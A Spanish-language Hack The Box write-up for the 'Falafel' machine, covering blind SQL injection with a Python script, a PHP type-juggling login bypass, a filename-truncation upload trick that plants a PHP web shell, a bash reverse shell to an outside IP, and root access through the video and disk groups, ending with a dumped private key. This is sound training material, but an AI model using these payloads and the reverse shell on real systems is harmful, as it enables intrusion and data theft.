---
layout: post
title: Falafel
date: 2023-02-11
description:
img:
fig-caption:
tags: [eWPT, eWPTXv2, OSWE]
---
___

<center><img src="/writeups/assets/img/Falafel-htb/Falafel.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Information Disclosure

* Inyección SQL - Conditional Based

* Python Scripting (BÁSICO)

* PHP Type Juggling Attack

* Arbitrary File Upload

* Desbordamiento de nombre de archivo

* Abuso del grupo video

* Abuso del grupo disk (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.10.73 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-11 16:44 GMT
Nmap scan report for 10.10.10.73
Host is up (0.059s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 16.50 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80 10.10.10.73 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-11 16:46 GMT
Nmap scan report for 10.10.10.73
Host is up (0.094s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 36c00a2643f8cea82c0d192110a6a8e7 (RSA)
|   256 cb20fdffa880f2a24b2bbbe17698d0fb (ECDSA)
|_  256 c4792bb6a9b7174c0740f3e57c1ae9dd (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Falafel Lovers
| http-robots.txt: 1 disallowed entry 
|_/*.txt
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.76 seconds
```

Detecta un archivo ```robots.txt```. Aplico fuzzing de archivos TXT

```null
gobuster dir -u http://10.10.10.73 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -x txt
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.73
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              txt
[+] Timeout:                 10s
===============================================================
2023/02/11 16:58:41 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 311] [--> http://10.10.10.73/images/]
/uploads              (Status: 301) [Size: 312] [--> http://10.10.10.73/uploads/]
/assets               (Status: 301) [Size: 311] [--> http://10.10.10.73/assets/]
/css                  (Status: 301) [Size: 308] [--> http://10.10.10.73/css/]
/js                   (Status: 301) [Size: 307] [--> http://10.10.10.73/js/]
/robots.txt           (Status: 200) [Size: 30]
/cyberlaw.txt         (Status: 200) [Size: 804]
/server-status        (Status: 403) [Size: 299]
```

El fichero ```cyberlaw.txt``` contiene lo siguiente:

```null
From: Falafel Network Admin (admin@falafel.htb)
Subject: URGENT!! MALICIOUS SITE TAKE OVER!
Date: November 25, 2017 3:30:58 PM PDT
To: lawyers@falafel.htb, devs@falafel.htb
Delivery-Date: Tue, 25 Nov 2017 15:31:01 -0700
Mime-Version: 1.0
X-Spam-Status: score=3.7 tests=DNS_FROM_RFC_POST, HTML_00_10, HTML_MESSAGE, HTML_SHORT_LENGTH version=3.1.7
X-Spam-Level: ***

A user named "chris" has informed me that he could log into MY account without knowing the password,
then take FULL CONTROL of the website using the image upload feature.
We got a cyber protection on the login form, and a senior php developer worked on filtering the URL of the upload,
so I have no idea how he did it.

Dear lawyers, please handle him. I believe Cyberlaw is on our side.
Dear develpors, fix this broken site ASAP.

	~admin
```

En el mensaje pone que es posible loggearse como el usuario Administrador desconociendo la contraseña

## Puerto 80 (HTTP)

Con whatweb analizo las tecnologías que está empleando el servidor web

```null
whatweb http://10.10.10.73
http://10.10.10.73 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], Email[IT@falafel.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.73], Script, Title[Falafel Lovers]
```

La página principal se ve así:

<img src="/writeups/assets/img/Falafel-htb/1.png" alt="">

Añado el dominio ```falafel.htb```al ```/etc/hosts```

Tiene un panel de inicio de sesión. El error es distinto cuando introduzco un usuario válido

<img src="/writeups/assets/img/Falafel-htb/2.png" alt="">

<img src="/writeups/assets/img/Falafel-htb/3.png" alt="">

Intento efectuar una inyección SQL, me salta una advertencia

<img src="/writeups/assets/img/Falafel-htb/4.png" alt="">

Utilizo un diccionario de Seclists para validar usuarios

```null
wfuzz -c --hh=7074 -t 200 -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -d 'username=FUZZ&password=admin' http://10.10.10.73/login.php
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.73/login.php
Total requests: 10177

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                        
=====================================================================

000000086:   200        102 L    659 W      7091 Ch     "admin"                                                                                                                                        
000001886:   200        102 L    659 W      7091 Ch     "chris"                                                                                                                                        

Total time: 0
Processed Requests: 10177
Filtered Requests: 10175
Requests/sec.: 0
```

Y busco archivos PHP

```null
gobuster dir -u http://10.10.10.73 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 150 -x php
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.73
[+] Method:                  GET
[+] Threads:                 150
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/02/11 17:07:38 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 311] [--> http://10.10.10.73/images/]
/index.php            (Status: 200) [Size: 7203]
/login.php            (Status: 200) [Size: 7063]
/profile.php          (Status: 302) [Size: 9787] [--> login.php]
/uploads              (Status: 301) [Size: 312] [--> http://10.10.10.73/uploads/]
/header.php           (Status: 200) [Size: 288]
/assets               (Status: 301) [Size: 311] [--> http://10.10.10.73/assets/]
/footer.php           (Status: 200) [Size: 0]
/upload.php           (Status: 302) [Size: 0] [--> profile.php]
/css                  (Status: 301) [Size: 308] [--> http://10.10.10.73/css/]
/js                   (Status: 301) [Size: 307] [--> http://10.10.10.73/js/]
/style.php            (Status: 200) [Size: 6174]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/connection.php       (Status: 200) [Size: 0]
/.php                 (Status: 403) [Size: 290]
/server-status        (Status: 403) [Size: 299]
Progress: 440327 / 441094 (99.83%)
===============================================================
2023/02/11 17:10:27 Finished
===============================================================
```

Puedo llegar a saber el número de columnas al aplicar un ordenamiento. El error cambia

<img src="/writeups/assets/img/Falafel-htb/5.png" alt="">

<img src="/writeups/assets/img/Falafel-htb/6.png" alt="">

Como muchas de las querys que introduzco son bloqueadas, más que intentar mostrar datos en el error puedo introducir una condición para que en caso de que se cumpla, el error cambie. Por ejemplo: ```admin' and substring(username,1,1)='a'```

Creo un script en python que se encargue de extraer la contraseña de los dos usuarios que tengo

```null
#!/usr/bin/python3

from pwn import *
import requests, time, sys, string, signal

def def_handler(sig, frame):
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales

main_url = "http://10.10.10.73/login.php"
characters = string.digits + string.ascii_lowercase

def makeRequest():
    
    p1 = log.progress("SQLi")
    p1.status("Dumpeando datos")
    time.sleep(2)

    p2 = log.progress("Contraseña; ")

    password = ""

    for position in range(1,60):
        for character in characters:
           
            post_data = {
                'username': "admin' and substring(password,%d,1)='%s'-- -" % (position, character),
                'password': 'admin'

            }

            p1.status(post_data['username'])

            r = requests.post(main_url, data=post_data)

            if "Try again.." not in r.text:
                password += character
                p2.status(password)
                break





if __name__ == '__main__':
    makeRequest()
```

Ejecuto el script y obtengo la contraseña

```null
python3 sqli.py
[┴] SQLi: admin' and substring(password,33,1)='g'-- -
[↓] Contraseña: 0e462096931906507119562988736854
```

Lo mismo para el otro usuario

```null
python3 sqli.py
[p] SQLi: chris' and substring(password,33,1)='h'-- -
[◤] Contraseña; : d4ee02a22fc872e36d9e3751ba72ddc8
```

Las introduzco en crackstation para intentar obtenerlas en texto claro

<img src="/writeups/assets/img/Falafel-htb/7.png" alt="">

Me puedo loggear como el usuario Chris, pero no como administrador

<img src="/writeups/assets/img/Falafel-htb/8.png" alt="">

Al intentar acceder a ```/upload.php``` me aplica un redirect a ```/profile.php```. Como en la pista CTF ponía que se podía acceder como administrador sin conocer la contraseña, es posible que sea vulnerable a Type Juggling. En este [artículo](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf) explican en que consiste

A resumidas cuentas, la contraseña del usuario Administrador comienza por un número seguido de una 'e' y más dígitos. A esto se le conoce como notación científica. Para que PHP no lo interprete así la validación se tiene que aplicar con '===' no con '=='.

Demostración:

```null
php --interactive
Interactive shell

php > if ("d4ee02a22fc872e36d9e3751ba72ddc8" == 0) { echo "Igual?"; } else { echo "No igual?"; }
No igual?
php > if ("d4ee02a22fc872e36d9e3751ba72ddc8" === 0) { echo "Igual?"; } else { echo "No igual?"; }
No igual?
php > if ("0e462096931906507119562988736854" == 0) { echo "Igual?"; } else { echo "No igual?"; }
Igual?
php > if ("0e462096931906507119562988736854" === 0) { echo "Igual?"; } else { echo "No igual?"; }
No igual?
php > 
```

El vector de ataque está en encontrar una contraseña que a la hora de hashearla tenga esa representación, el problema está en que no es el tipo al que me estoy enfrentando, pero voy a suponer que es MD5. En este [post](https://news.ycombinator.com/item?id=9484757) está detallado como se puede aplicar dicha colisión para obtener la estructura deseada. Muestran 3 hashes precomputados que cumplen esas características. Podría crear un diccionario con crunch y buscarlos por mi cuenta, pero el proceso es muy lento y no merece la pena

```null
echo -n aabg7XSs | md5sum
0e087386482136013740957780965295  -
```

Introduciendo la contraseña correspondiente a ese hash me puedo loggear sin problema como ```admin```

<img src="/writeups/assets/img/Falafel-htb/9.png" alt="">

Subo una imagen de prueba, y veo que se está ejecutando un ```wget``` por detrás

<img src="/writeups/assets/img/Falafel-htb/10.png" alt="">

No puedo inyectar un comando adicional porque aplica una validación a la extensión. Puedo probar un SSRF

De primeras bloquea apuntar a la loopback

<img src="/writeups/assets/img/Falafel-htb/11.png" alt="">

Si la represento en hexadecimal ocurre lo mismo. Pruebo también a introducir otra IP dentro del segmento '127' que debería ser lo mismo. Hago una prueba en mi equipo para asegurarme

```null
ping -c 1 127.4.4.4
PING 127.4.4.4 (127.4.4.4) 56(84) bytes of data.
64 bytes from 127.4.4.4: icmp_seq=1 ttl=64 time=0.023 ms

--- 127.4.4.4 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.023/0.023/0.023/0.000 ms
```

Tampoco funciona. Solo faltaría probar a cambiarle el nombre del archivo por uno de una longitud mayor a 255 bytes, que es el límite para renombrar un archivo. Renombro mi archivo de ejemplo con tantas "A" como para llegar al tope, restándole 4 bytes que corresponden a la extensión

```null
mv example.jpg $(python3 -c 'print("A"* 251 + ".jpg")')
```
Me comparto un servicio HTTP con python, y a la hora de descargar el archivo lo renombra para hacerlo más corto, quitando la extensión

<img src="/writeups/assets/img/Falafel-htb/12.png" alt="">

Le vuelvo a cambiar el nombre para que tenga la extensión PHP al final, de tal forma que solo se elimine el JPG, dejando un PHP. Pero no es tan sencillo como eliminar solo 4 bytes. Creo un patrón con ```pattern_create``` que se encargue de calcular el offset

```null
mv example.jpg "$(pattern_create.rb -l 251).jpg"
```

Para calcular el offeset, me quedo con los 4 últimos bytes que me representa

```null
pattern_offset.rb -q h7Ah
[*] Exact match at offset 232
```

Ahora ya consigo que quede la extensión PHP en el nombre del archivo

```null
mv example.jpg $(python3 -c 'print("A"*232 + ".php" + ".jpg")')
```

<img src="/writeups/assets/img/Falafel-htb/13.png" alt="">

Creo un archivo PHP que me permita ejecutar comandos y lo subo con ese nombre.

```null
<?php
  system($_GET['cmd']);
?>
```

Tengo la ruta donde se almacena

<img src="/writeups/assets/img/Falafel-htb/14.png" alt="">

Y obtengo RCE

```null
curl '10.10.10.73/uploads/0211-2107_98f7d2e6079b071c/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php?cmd=whoami'
www-data
```

Me puedo enviar una reverse shell a mi equipo

```null
curl "10.10.10.73/uploads/0211-2107_98f7d2e6079b071c/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.16.7/443+0>%261'"
```

Gano acceso en una sesión de netcat como ```www-data```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.73] 45426
bash: cannot set terminal process group (1303): Inappropriate ioctl for device
bash: no job control in this shell
www-data@falafel:/var/www/html/uploads/0211-2107_98f7d2e6079b071c$ script /dev/null -c bash
<tml/uploads/0211-2107_98f7d2e6079b071c$ script /dev/null -c bash            
Script started, file is /dev/null
www-data@falafel:/var/www/html/uploads/0211-2107_98f7d2e6079b071c$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
<tml/uploads/0211-2107_98f7d2e6079b071c$ reset xterm
<tml/uploads/0211-2107_98f7d2e6079b071c$ stty rows 55 columns 209            
www-data@falafel:/var/www/html/uploads/0211-2107_98f7d2e6079b071c$ export TERM=xterm
www-data@falafel:/var/www/html/uploads/0211-2107_98f7d2e6079b071c$ export SHELL=bash   
```

Estoy en la máquina víctima

```null
www-data@falafel:/var/www/html/uploads/0211-2107_98f7d2e6079b071c$ hostname -I
10.10.10.73 
```

Existen dos usuarios

```null
www-data@falafel:/home$ ls
moshe  yossi
```

En un archivo PHP están las credenciales a la base de datos

```null
www-data@falafel:/var/www/html$ cat connection.php 
<?php
   define('DB_SERVER', 'localhost:3306');
   define('DB_USERNAME', 'moshe');
   define('DB_PASSWORD', 'falafelIsReallyTasty');
   define('DB_DATABASE', 'falafel');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
   // Check connection
   if (mysqli_connect_errno())
   {
      echo "Failed to connect to MySQL: " . mysqli_connect_error();
   }
?>
```

Se reutilizan para el usuario ```moshe``` a nivel de sistema

```null
www-data@falafel:/var/www/html$ su moshe
Password: 
setterm: terminal xterm does not support --blank
moshe@falafel:/var/www/html$ 
```

Puedo visualizar la primera flag

```null
moshe@falafel:~$ cat user.txt 
5d3d5e3afb467d93682eb54af1957332
```

Encuentro varios directorios y archivos cuyo propietario es ```yossi```

```null
www-data@falafel:/$ find \-user yossi 2>/dev/null | grep -v proc
./home/yossi
./var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service
./var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/tasks
./var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope
./var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope/tasks
./var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.clone_children
./var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope/notify_on_release
./sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service
./sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/tasks
./sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope
./sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope/tasks
./sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.clone_children
./sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope/notify_on_release
./dev/tty1
./run/user/1000
```

Tiene una terminal abierta

Estoy en varios grupos asignado

```null
moshe@falafel:~$ id
uid=1001(moshe) gid=1001(moshe) groups=1001(moshe),4(adm),8(mail),9(news),22(voice),25(floppy),29(audio),44(video),60(games)
```

Como estoy en el grupo video, puedo intentar sacar una captura de pantalla de la terminal de ```yossi```. Busco por los archivos que tengan pertenezcan a ```video```

```null
moshe@falafel:/$ find \-group video 2>/dev/null 
./dev/fb0
./dev/dri/card0
./dev/dri/renderD128
./dev/dri/controlD64
```

En [Hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-privesc#video-group) hay una sección dedicada a esto. Exporto el contenido de ```/dev/fb0``` a un archivo para traerlo a mi equipo

```null
cat /dev/fb0 > /tmp/screen.raw
```

Lo detecta como una imagen

```null
file captura.raw
captura.raw: Targa image data - Map (256-257) 257 x 1 x 1 +257 +1 - 1-bit alpha "\001"
```

De primeras no la puedo abrir, faltan archivos

```null
icat captura.raw
Failed to open image: captura.raw with error: identify-im6.q16: delegate failed `'ufraw-batch' --silent --create-id=also --out-type=png --out-depth=16 --output='%u.png' '%i'' @ error/delegate.c/InvokeDelegate/1966.
identify-im6.q16: unable to open image `/tmp/magick-Z7LyQiGHX0NkOqIZcX4lQisAnVx690G7.ppm': No such file or directory @ error/blob.c/OpenBlob/2924.
```

Miro cual es el tamaño de la terminal de ```yossi```

```null
moshe@falafel:/$ find \-name fb0 2>/dev/null 
./sys/devices/pci0000:00/0000:00:0f.0/graphics/fb0
./sys/class/graphics/fb0
./dev/fb0

moshe@falafel:/tmp$ cat /sys/class/graphics/fb0/virtual_size
1176,885
```

Con ```GIMP``` abro la captura, indicándole que es data en bruto

<img src="/writeups/assets/img/Falafel-htb/15.png" alt="">

Le indico las proporciones que tenía de antes

<img src="/writeups/assets/img/Falafel-htb/16.png" alt="">

Obtengo la captura

<img src="/writeups/assets/img/Falafel-htb/17.png" alt="">

Me convierto en este usuario

```null
moshe@falafel:/$ su yossi
Password: 
yossi@falafel:/$ 
```

# Escalada

Ahora tengo acceso a otros grupos distintos

```null
yossi@falafel:~$ id
uid=1000(yossi) gid=1000(yossi) groups=1000(yossi),4(adm),6(disk),24(cdrom),30(dip),46(plugdev),117(lpadmin),118(sambashare)
```

```disk``` puede ser crítico, ya que tengo acceso a las unidades lógicas, entre ellas la que almacena el sistema

```null
yossi@falafel:/$ find \-group disk 2>/dev/null 
./dev/btrfs-control
./dev/sda5
./dev/sda2
./dev/sda1
./dev/sg0
./dev/sda
./dev/loop7
./dev/loop6
./dev/loop5
./dev/loop4
./dev/loop3
./dev/loop2
./dev/loop1
./dev/loop0
./dev/loop-control

yossi@falafel:/$ fdisk -l
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x2aa34854

Device     Boot   Start     End Sectors  Size Id Type
/dev/sda1          2048 7337983 7335936  3.5G 83 Linux
/dev/sda2       7337984 8388607 1050624  513M  5 Extended
/dev/sda5       7340032 8388607 1048576  512M 82 Linux swap / Solaris
```

Con ```debugfs``` me puedo conectar al disco que quiera

```null
yossi@falafel:/$ debugfs /dev/sda1
debugfs 1.42.13 (17-May-2015)
```

Puedo visualizar la segunda flag

```null
debugfs:  cat /root/root.txt
69ce499561cde33c720a5cebf76a8f2d
```

Para ganar acceso al sistema, me puedo traer la id_rsa

```null
debugfs:  cat /root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAyPdlQuyVr/L4xXiDVK8lTn88k4zVEEfiRVQ1AWxQPOHY7q0h
b+Zd6WPVczObUnC+TaElpDXhf3gjLvjXvn7qGuZekNdB1aoWt5IKT90yz9vUx/gf
v22+b8XdCdzyXpJW0fAmEN+m5DAETxHDzPdNfpswwYpDX0gqLCZIuMC7Z8D8Wpkg
BWQ5RfpdFDWvIexRDfwj/Dx+tiIPGcYtkpQ/UihaDgF0gwj912Zc1N5+0sILX/Qd
UQ+ZywP/qj1FI+ki/kJcYsW/5JZcG20xS0QgNvUBGpr+MGh2urh4angLcqu5b/ZV
dmoHaOx/UOrNywkp486/SQtn30Er7SlM29/8PQIDAQABAoIBAQCGd5qmw/yIZU/1
eWSOpj6VHmee5q2tnhuVffmVgS7S/d8UHH3yDLcrseQhmBdGey+qa7fu/ypqCy2n
gVOCIBNuelQuIAnp+EwI+kuyEnSsRhBC2RANG1ZAHal/rvnxM4OqJ0ChK7TUnBhV
+7IClDqjCx39chEQUQ3+yoMAM91xVqztgWvl85Hh22IQgFnIu/ghav8Iqps/tuZ0
/YE1+vOouJPD894UEUH5+Bj+EvBJ8+pyXUCt7FQiidWQbSlfNLUWNdlBpwabk6Td
OnO+rf/vtYg+RQC+Y7zUpyLONYP+9S6WvJ/lqszXrYKRtlQg+8Pf7yhcOz/n7G08
kta/3DH1AoGBAO0itIeAiaeXTw5dmdza5xIDsx/c3DU+yi+6hDnV1KMTe3zK/yjG
UBLnBo6FpAJr0w0XNALbnm2RToX7OfqpVeQsAsHZTSfmo4fbQMY7nWMvSuXZV3lG
ahkTSKUnpk2/EVRQriFjlXuvBoBh0qLVhZIKqZBaavU6iaplPVz72VvLAoGBANj0
GcJ34ozu/XuhlXNVlm5ZQqHxHkiZrOU9aM7umQkGeM9vNFOwWYl6l9g4qMq7ArMr
5SmT+XoWQtK9dSHVNXr4XWRaH6aow/oazY05W/BgXRMxolVSHdNE23xuX9dlwMPB
f/y3ZeVpbREroPOx9rZpYiE76W1gZ67H6TV0HJcXAoGBAOdgCnd/8lAkcY2ZxIva
xsUr+PWo4O/O8SY6vdNUkWIAm2e7BdX6EZ0v75TWTp3SKR5HuobjVKSht9VAuGSc
HuNAEfykkwTQpFTlmEETX9CsD09PjmsVSmZnC2Wh10FaoYT8J7sKWItSzmwrhoM9
BVPmtWXU4zGdST+KAqKcVYubAoGAHR5GBs/IXFoHM3ywblZiZlUcmFegVOYrSmk/
k+Z6K7fupwip4UGeAtGtZ5vTK8KFzj5p93ag2T37ogVDn1LaZrLG9h0Sem/UPdEz
HW1BZbXJSDY1L3ZiAmUPgFfgDSze/mcOIoEK8AuCU/ejFpIgJsNmJEfCQKfbwp2a
M05uN+kCgYBq8iNfzNHK3qY+iaQNISQ657Qz0sPoMrzQ6gAmTNjNfWpU8tEHqrCP
NZTQDYCA31J/gKIl2BT8+ywQL50avvbxcXZEsy14ExVnaTpPQ9m2INlxz97YLxjZ
FEUbkAlzcvN/S3LJiFbnkQ7uJ0nPj4oPw1XBcmsQoBwPFOcCEvHSrg==
-----END RSA PRIVATE KEY-----
```

```null
ssh root@10.10.10.73 -i id_rsa
The authenticity of host '10.10.10.73 (10.10.10.73)' can't be established.
ED25519 key fingerprint is SHA256:HkqcmyRF5DsZuFTcQxQ4QcKq7eG+mQMn8MX9G5RkN5s.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.73' (ED25519) to the list of known hosts.
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


Last login: Tue May  1 20:14:09 2018 from 10.10.14.4
root@falafel:~# 
```